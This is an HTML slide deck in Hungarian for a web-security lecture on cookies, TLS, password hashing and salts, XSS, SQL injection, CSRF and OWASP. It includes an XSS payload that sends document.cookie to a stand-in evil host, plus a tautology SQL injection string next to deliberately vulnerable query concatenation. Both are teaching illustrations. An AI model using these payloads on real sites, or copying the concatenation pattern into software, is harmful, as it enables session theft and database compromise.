<!DOCTYPE html>
<html>
  <head>
    <title>Title</title>
    <meta charset="utf-8">
    <style>
      @import url(https://fonts.googleapis.com/css?family=Yanone+Kaffeesatz);
      @import url(https://fonts.googleapis.com/css?family=Droid+Serif:400,700,400italic);
      @import url(https://fonts.googleapis.com/css?family=Ubuntu+Mono:400,700,400italic);

      body { font-family: 'Droid Serif'; }
      h1, h2, h3 {
        font-family: 'Yanone Kaffeesatz';
        font-weight: normal;
      }
      img {
	          max-width: 100%;
      }

      .remark-code { font-size: 1.2em; }, .remark-inline-code { font-family: 'Ubuntu Mono'; }
    </style>
  </head>
  <body>
    <textarea id="source">

class: center, middle

# HTTP security

---

# HTTP session

- A HTTP stateless

--

- Kell valami ami azonosít egy sessiont
- Cookie

```
Cookie:"PHPSESSID=3rqf0186spggo3evc2ged0p4p7"
```
--

### Mi van ha ellopják?

---

# Mi van ha ellopják a cookie-t?

- Lehallgatással
- XSSsel (később)
- Ki tudja még mivel ( heartbleed )

---

# SSL/TLS
- Lehallgatás ellen + azonosítja a szervert
- Asszimetrikus titkosításon alapszik
- A szerver privát kulcsa nélkül nem lehet visszafejteni (vagy még azzal sem)

![SSL handshake](https://zoompf.com/wp-content/uploads/2014/10/handshake.png)
---
# Mi van ha ellopják a certficate-et?
---

# Usernév / jelszó
## Adatbázisban

--

### Mi van ha ellopják?

---

# Usernév / jelszó

Hasheljünk, hogy ne derüljön ki mi a jelszó

    hash("kiskacsa") => 73dc4c576a5a6062c52922b39ef9cfd6

    Visszafelé nem működik
--
### Mi van ha ellopják?

--

  ### 1. Brute force kipörgetik
  ### 2. Jelszó adatbázisok / szivárványtáblák

---

# Brute force ellen

Megfelelő nehézségű hash
- bcrypt
        - néhány linux disztribúció is ezt használja
        - paraméterezhető az iterációszám
- scrypt
        - jobban paraméterezhető
        - CPU
        - memória

---

# Salt

- a salt cleartextben van az adatbázisban
- hash(password+salt)
- Ha két usernek ugyanaz a jelszava, akkor ez nem fog látszani
- Az előre legyártott táblázatok kevesebbet fognak érni
- A lényege nem a hossz, hanem hogy egyedinek kell lennie

---

# Ne is tároljunk user nevet / jelszót

OpenID / OAUTH2
---

class: center, middle
# Injection

## XSS (injection a weboldal tartalmába)
## SQL és barátai injection

---

XSS

Ha valami user által beadott tartalom megjelenik a visszaadott oldalban

```html
<img src="gonoszoldal.cn/"+document.cookie >
```

--

Megoldás: Mindent escape-elni kell, ami megjelenik

---

# SQL injection

``` python
username=request.form['username']
hash=hex(hash(request.form['password']))
query="SELECT * FROM users WHERE username='"
     + username + "' and hash='" + hash +"'"
```

--

```python

username="' OR 'a'='a' -- "
query="SELECT * FROM users WHERE username=''
       OR 'a'='a' -- 'and hash='...'
```

---

# SQL injection

Megoldás: Használjunk API-kat
Ha stringeket konkatenálunk, az már eleve gyanús
---

# MongoDb injection

---

# CSRF

Más nevében küldetünk egy kérést

---

class: center, middle
# Megbíznék a kódban, amit csináltam?

---

class: center, middle
# Nem!

---

# Fontos

## Ne csinálj saját cryptót
### Pl side channel támadások
## Ne csinálj saját cryptót
### Mert úgyis elrontod
## Ellenőrizd a bejövő paramétereket

---

# Fontos

## Ne csinálj saját cryptót
### Pl side channel támadások
## Ne csinálj saját cryptót
### Mert úgyis elrontod
## Ellenőrizd a bejövő paramétereket

---

class: center, middle

#OWASP
owasp.org
![OWASP TOP 10](OWASP_TOP_10.png)

    </textarea>
    <script src="https://gnab.github.io/remark/downloads/remark-latest.min.js">
    </script>
    <script>
      var slideshow = remark.create();
    </script>
  </body>
</html>
